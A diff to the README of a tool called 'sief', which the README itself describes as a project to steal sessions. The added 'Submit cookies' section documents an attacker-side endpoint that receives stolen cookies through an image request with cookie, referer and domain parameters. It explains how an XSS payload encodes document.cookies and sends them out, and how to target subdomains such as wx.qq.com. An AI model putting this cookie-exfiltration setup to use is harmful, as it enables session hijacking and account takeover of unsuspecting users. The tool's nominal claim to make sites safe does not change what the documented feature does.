@@ -23,6 +23,8 @@ This is a project to steal sessions, and to make your site safe.
 
 ## Usage
 
+### Server
+
     Usage: sief [options] <plugin|dir ...>
 
     Options:
@@ -34,4 +36,12 @@ This is a project to steal sessions, and to make your site safe.
       -l, --log-level [level]      set log level [INFO]
 
 
+### Submit cookies
 
+    GET /xxx.png?cookie=#cookies#&referer=#referer#&domain=#domani#
+
+Parameters:
+
+* `cookies` - Required. Encode cookies first, for example, `encodeURIComponent(document.cookies)`
+* `referer` - If the attack is an xss exploit, referer will be retrieved from `headers.referer` directly, otherwise, specifiy it in query string.
+* `domain` - Domain is calculated from referer, defaults to main domain, for example `qq.com`. IF you want to fire a attack to its subdomain(`wx.qq.com`), specify it in query string.
